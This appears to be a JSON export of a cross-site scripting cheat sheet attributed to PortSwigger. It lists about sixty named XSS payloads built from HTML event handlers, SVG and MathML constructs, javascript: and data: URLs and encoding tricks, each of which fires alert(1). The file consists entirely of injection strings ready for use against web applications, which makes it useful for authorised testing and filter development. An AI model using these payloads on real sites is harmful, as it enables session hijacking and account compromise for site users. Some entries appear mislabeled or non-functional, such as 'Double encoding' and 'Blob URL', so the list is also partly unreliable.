{
  "source": "PortSwigger XSS Cheat Sheet",
  "url": "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
  "lastUpdated": "2026-01-08",
  "payloads": [
    {"name": "Event without tag name", "payload": "<><img src=x onerror=alert(1)>"},
    {"name": "Double encoding", "payload": "<img src=x onerror=\"&#x61;lert(1)\">"},
    {"name": "SVG foreignObject", "payload": "<svg><foreignObject><iframe srcdoc='<script>alert(1)</script>'></iframe></foreignObject></svg>"},
    {"name": "SVG set onbegin", "payload": "<svg><set onbegin=alert(1)>"},
    {"name": "SVG animate onbegin", "payload": "<svg><animate onbegin=alert(1) attributeName=x>"},
    {"name": "SVG discard onbegin", "payload": "<svg><discard onbegin=alert(1)>"},
    {"name": "Details ontoggle v2", "payload": "<details ontoggle=alert(1) open>"},
    {"name": "Body onresize", "payload": "<body onresize=alert(1)>"},
    {"name": "Input onblur", "payload": "<input onblur=alert(1) autofocus><input autofocus>"},
    {"name": "Video ontimeupdate", "payload": "<video ontimeupdate=alert(1) autoplay><source>"},
    {"name": "Video onloadstart", "payload": "<video onloadstart=alert(1) autoplay><source>"},
    {"name": "Body onscroll", "payload": "<body onscroll=alert(1)><br><br><br><br><br>"},
    {"name": "SVG use xlink:href", "payload": "<svg><use xlink:href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\">"},
    {"name": "IMG srcset onerror", "payload": "<img srcset=x onerror=alert(1)>"},
    {"name": "Form button formaction", "payload": "<form><button formaction=javascript:alert(1)>XSS</button>"},
    {"name": "Form input formaction", "payload": "<form><input type=submit formaction=javascript:alert(1)>"},
    {"name": "Isindex action", "payload": "<isindex action=javascript:alert(1) type=submit>"},
    {"name": "Base target", "payload": "<base target=javascript:alert(1)//>"},
    {"name": "Object param", "payload": "<object><param name=url value=javascript:alert(1)>"},
    {"name": "A xlink href", "payload": "<svg><a xlink:href=\"javascript:alert(1)\"><text>XSS</text></a></svg>"},
    {"name": "Animate xlink href", "payload": "<svg><animate xlink:href=#x attributeName=href values=javascript:alert(1)><a id=x><text>XSS</text></a></animate>"},
    {"name": "Template", "payload": "<template><img src=x onerror=alert(1)></template>"},
    {"name": "Noscript", "payload": "<noscript><img src=x onerror=alert(1)></noscript>"},
    {"name": "Frameset onload", "payload": "<frameset onload=alert(1)>"},
    {"name": "Slot element", "payload": "<x><slot name=x slot=x></slot></x><img src=x slot=x onerror=alert(1)>"},
    {"name": "Custom element callback", "payload": "<x-x onclick=alert(1)>XSS</x-x>"},
    {"name": "Data URL SVG", "payload": "<a href=\"data:image/svg+xml,<svg onload=alert(1)>\">XSS</a>"},
    {"name": "Data URL html", "payload": "<iframe src=\"data:text/html,<script>alert(1)</script>\">"},
    {"name": "Data URL base64 SVG", "payload": "<embed src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">"},
    {"name": "Blob URL", "payload": "<a href=\"blob:https://example.com/x\">XSS</a>"},
    {"name": "Javascript URL entity", "payload": "<a href=\"&#106;avascript:alert(1)\">XSS</a>"},
    {"name": "Javascript URL newline", "payload": "<a href=\"java\nscript:alert(1)\">XSS</a>"},
    {"name": "Javascript URL tab", "payload": "<a href=\"java\tscript:alert(1)\">XSS</a>"},
    {"name": "Javascript URL comment", "payload": "<a href=\"javascript://comment%0aalert(1)\">XSS</a>"},
    {"name": "Srcdoc", "payload": "<iframe srcdoc=\"<script>alert(1)</script>\">"},
    {"name": "HTML import", "payload": "<link rel=import href=\"data:text/html,<script>alert(1)</script>\">"},
    {"name": "Picture source onerror", "payload": "<picture><source srcset=x onerror=alert(1)><img></picture>"},
    {"name": "Meter onmouseover", "payload": "<meter onmouseover=alert(1)>0</meter>"},
    {"name": "Marquee onfinish", "payload": "<marquee onfinish=alert(1) loop=1>XSS</marquee>"},
    {"name": "Menu context", "payload": "<div contextmenu=x><menu id=x type=context><menuitem onclick=alert(1)></menuitem></menu>"},
    {"name": "Dialog close event", "payload": "<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>"},
    {"name": "MathML", "payload": "<math><x><mglyph><svg><mtext><style><img src=x onerror=alert(1)></style></mtext></svg></mglyph></x></math>"},
    {"name": "IMG onloadend", "payload": "<img onloadend=alert(1) src=x>"},
    {"name": "Contenteditable oncut", "payload": "<div contenteditable oncut=alert(1)>XSS</div>"},
    {"name": "Contenteditable oncopy", "payload": "<div contenteditable oncopy=alert(1)>XSS</div>"},
    {"name": "Contenteditable onpaste", "payload": "<div contenteditable onpaste=alert(1)>XSS</div>"},
    {"name": "Draggable ondragstart", "payload": "<div draggable=true ondragstart=alert(1)>XSS</div>"},
    {"name": "HTML onbeforecopy", "payload": "<html onbeforecopy=alert(1)>"},
    {"name": "HTML onbeforecut", "payload": "<html onbeforecut=alert(1)>"},
    {"name": "HTML onbeforepaste", "payload": "<html onbeforepaste=alert(1)>"},
    {"name": "Img decode onload", "payload": "<img decode=async onload=alert(1) src=x.gif>"},
    {"name": "Object typemustmatch", "payload": "<object data=\"data:text/html,<script>alert(1)</script>\" typemustmatch=\"\" type=\"text/html\">"},
    {"name": "Acronym onclick", "payload": "<acronym onclick=alert(1)>XSS</acronym>"},
    {"name": "Bdo onclick", "payload": "<bdo onclick=alert(1)>XSS</bdo>"},
    {"name": "Command onclick", "payload": "<command onclick=alert(1)>XSS</command>"},
    {"name": "Image onerror", "payload": "<image onerror=alert(1) src=x>"},
    {"name": "IMG dynsrc low", "payload": "<img dynsrc=x lowsrc=x onerror=alert(1)>"},
    {"name": "Img loading", "payload": "<img loading=eager onload=alert(1) src=x.gif>"},
    {"name": "Portal src", "payload": "<portal src=\"javascript:alert(1)\">"},
    {"name": "Ruby onclick", "payload": "<ruby onclick=alert(1)>XSS</ruby>"},
    {"name": "Summary onclick", "payload": "<summary onclick=alert(1)>XSS</summary>"},
    {"name": "XMP onmouseover", "payload": "<xmp onmouseover=alert(1)>XSS</xmp>"},
    {"name": "Namespace pollution", "payload": "<svg><handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:observer=\"\" ev:handler=\"javascript:alert(1)\"/>"}
  ]
}
